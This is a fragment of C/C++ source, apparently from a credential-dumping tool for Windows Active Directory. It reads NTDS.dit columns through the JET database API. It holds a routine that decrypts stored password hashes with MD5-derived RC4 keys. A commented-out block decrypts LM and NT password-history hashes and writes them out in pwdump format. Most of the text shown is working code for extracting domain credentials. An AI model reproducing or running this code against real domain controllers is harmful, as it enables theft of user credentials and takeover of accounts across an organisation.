...
VOID DecryptSAM(DWORD rid, PBYTE pbHash, char str[], BYTE pek[]) {
  MD5_CTX ctx;
  RC4_KEY key;

  unsigned char md5hash[MD5_DIGEST_LENGTH];
  BYTE obfkey[16], plaintext[16];
  
  // decrypt the ciphertext
  MD5_Init(&ctx);
  MD5_Update(&ctx, pek, 16);
  MD5_Update(&ctx, &rid, 4);
  MD5_Update(&ctx, str, strlen(str) + 1);
  MD5_Final(md5hash, &ctx);

  RC4_set_key(&key, 16, md5hash);
  RC4(&key, 16, pbHash, obfkey);
        ...
        if (err == JET_errSuccess) {
          ...
          if (err == JET_errSuccess) {
            ...
            /*if (bHistory) {
              ...
              // get lmPwdHistory
              DWORD dwSize = GetColumnData(lmHistId, 
                  (PVOID)lmHistory, sizeof(lmHistory));

              if (err == JET_errSuccess && dwSize != 0) {
                //DecryptSAM(rid, lmHistory, "LMPASSWORDHISTORY\0", pekList.Data.bKey);
                DecryptSecret(rid, lmHistory);
                if (memcmp(lmHistory, lmHash, LM_HASH_LEN) != 0) {
                  bHash = TRUE;
                  lm = bin2hex(lmHistory, LM_HASH_LEN);
                  lmHashes++;
                } else {
                  lm = L"aad3b435b51404eeaad3b435b51404ee:";
                }
              } else {
                lm = L"aad3b435b51404eeaad3b435b51404ee:";
              }
              ...
              // get ntPwdHistory
              dwSize = GetColumnData(ntHistId, 
                  (PVOID)ntHistory, sizeof(ntHistory));

              if (err == JET_errSuccess && dwSize != 0) {
                //DecryptSAM(rid, ntHistory, "NTPASSWORDHISTORY\0", pekList.Data.bKey);
                DecryptSecret(rid, ntHistory);
                if (memcmp(ntHistory, ntHash, NT_HASH_LEN) != 0) {
                  bHash = TRUE;
                  ntlm = bin2hex(ntHistory, NT_HASH_LEN);
                  ntHashes++;
                } else {
                  ntlm = L"31d6cfe0d16ae931b73c59d7e0c089c0";
                }
              } else {
                ntlm = L"31d6cfe0d16ae931b73c59d7e0c089c0";
              }
              ...
              if (bHash) {
                dwHistory++;
                fwprintf(out, L"%s:%i:%s:%s:[HISTORY] %s:%s\n", samName, rid, lm.c_str(), 
                    ntlm.c_str(), desc.c_str(), home.c_str());
              }
            }*/
            dwUsers++;
          }
